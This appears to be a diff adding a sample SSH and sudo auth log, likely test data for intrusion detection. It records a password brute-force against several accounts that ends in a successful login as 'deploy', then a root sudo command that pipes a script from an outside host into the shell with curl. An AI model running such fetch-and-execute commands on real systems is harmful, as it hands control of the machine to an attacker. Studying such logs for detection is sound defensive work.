@@ -1,0 +1,11 @@
+Jun  3 04:11:58 web01 sshd[2201]: Failed password for invalid user admin from 203.0.113.7 port 51200 ssh2
+Jun  3 04:11:59 web01 sshd[2202]: Failed password for invalid user test from 203.0.113.7 port 51210 ssh2
+Jun  3 04:12:01 web01 sshd[2203]: Failed password for invalid user oracle from 203.0.113.7 port 51221 ssh2
+Jun  3 04:12:03 web01 sshd[2204]: Failed password for root from 203.0.113.7 port 51232 ssh2
+Jun  3 04:12:05 web01 sshd[2205]: Failed password for root from 203.0.113.7 port 51240 ssh2
+Jun  3 04:12:07 web01 sshd[2206]: Failed password for root from 203.0.113.7 port 51251 ssh2
+Jun  3 04:12:09 web01 sshd[2207]: Failed password for deploy from 203.0.113.7 port 51260 ssh2
+Jun  3 04:12:12 web01 sshd[2208]: Failed password for deploy from 203.0.113.7 port 51272 ssh2
+Jun  3 04:12:15 web01 sshd[2209]: Accepted password for deploy from 203.0.113.7 port 51280 ssh2
+Jun  3 04:12:31 web01 sudo[2240]:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash -c curl http://198.51.100.66/x.sh | sh
+Jun  3 04:13:02 web01 sshd[2260]: Accepted publickey for alice from 10.0.0.5 port 49210 ssh2
